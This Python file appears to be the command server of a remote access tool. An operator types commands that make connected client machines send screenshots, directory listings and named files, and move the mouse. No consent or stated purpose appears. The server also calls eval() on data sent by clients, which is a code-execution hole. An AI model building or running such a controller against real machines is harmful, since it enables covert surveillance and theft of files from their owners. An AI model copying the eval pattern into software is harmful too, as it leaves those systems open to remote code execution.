import socket
import os
from _thread import *

FORMAT="utf-8"

x=y=0
ThreadCount = 0


host = socket.gethostname()
port = 5000
server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    server_socket.bind((host, port))
except socket.error as e:
    print(str(e))
print('Socket is listening..')
server_socket.listen(5)

def multi_threaded_client(conn):
    
    conn.send(str.encode('Server is working:'))
    while True:
        
        data = input(' -> ')
        conn.send(data.encode())  

        # -----> get screenshot 
        if data=="screenshot":
            file_name = conn.recv(1024).decode()
            print(file_name)
            conn.send("Filename received.".encode(FORMAT))
            file_size= int(conn.recv(1024).decode())
            conn.send("Filesize received.".encode(FORMAT))
            print(file_size,end='\n')
            file=open(file_name,"wb")
            chunk=conn.recv(2048) #stream based
            while chunk:
                file.write(chunk)
                chunk=conn.recv(2048)

            conn.send("Filename received.".encode(FORMAT))
            file.close()
            conn.close()
            

        # -----> move mouse 
        if data == f"move your mouse":
             m=conn.recv(1024).decode()
             print(m)
             x= input()
             conn.send(x.encode(FORMAT))


        # -----> give directory list 
        if data == "send me directory list":
            list= conn.recv(1024).decode(FORMAT)
            list=eval(list)
            print(list,end='\n')
            print(conn.recv(1024).decode(FORMAT))
            conn.send("list received".encode())
            inp=input("->")
            conn.send(inp.encode())
            if inp=="ok":
                pass
            else:
                print(conn.recv(1024).decode(FORMAT))
                conn.send("C:\\Users\\ASUS\\Downloads".encode(FORMAT))
                list2= conn.recv(1024).decode(FORMAT)
                list2=eval(list2)
                print(list2,end='\n')
                print(conn.recv(1024).decode(FORMAT))

            # -----> receive file 
            file_name=input(' -> send me: ')
            conn.send(file_name.encode())
            file = open("recieved_file.txt", "w")
            data = conn.recv(1024).decode(FORMAT)
            file.write(data)
            conn.send("file recieved".encode())
            file.close()
            conn.close()
            print("disconnected")
        if not data:
            break
        print(conn.recv(1024).decode())

while True:
    Client, address = server_socket.accept()
    print('Connected to: ' + address[0] + ':' + str(address[1]))
    start_new_thread(multi_threaded_client, (Client, ))
    ThreadCount += 1
    print('Thread Number: ' + str(ThreadCount))
server_socket.close()